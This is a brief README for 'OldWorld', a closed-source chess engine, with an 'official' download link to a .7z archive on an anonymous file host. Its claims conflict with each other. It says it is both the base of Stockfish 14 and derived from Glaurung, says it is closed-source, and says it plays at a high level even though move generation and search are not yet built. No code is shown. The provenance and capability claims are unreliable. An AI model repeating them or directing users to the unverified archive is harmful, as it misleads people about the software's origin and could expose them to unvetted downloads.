# OldWorld
![OldWorld Logo](./oldworld.png)

OldWorld is a work-in-progress, closed-source UCI chess engine. It’s being built to be simple to understand, easy to work with, and strong enough to play at a high level against strong engines like Komodo, Rubichess, Carp, and more. This engine is the base of Stockfish 14, derived from the chess engine Glaurung.

You can officially download the Oldworld chess engine/software [here.](https://files.catbox.moe/ghtcrq.7z)

### Current State
Right now, OldWorld is still under development, so it requires UCI support to be used in a GUI for analyzing positons and games. The main focus is on building solid MCTS functionality, then after I can start working on other important functionalities such as movegen and search.

### Goals
The purpose of OldWorld is to be a learning engine. It’s meant for anyone curious about how chess engines work, think, and perform. While it’s not on the same strength level as Lc0, Komodo, or Obsidian, it shares its roots and gives a foundation to experiment on.
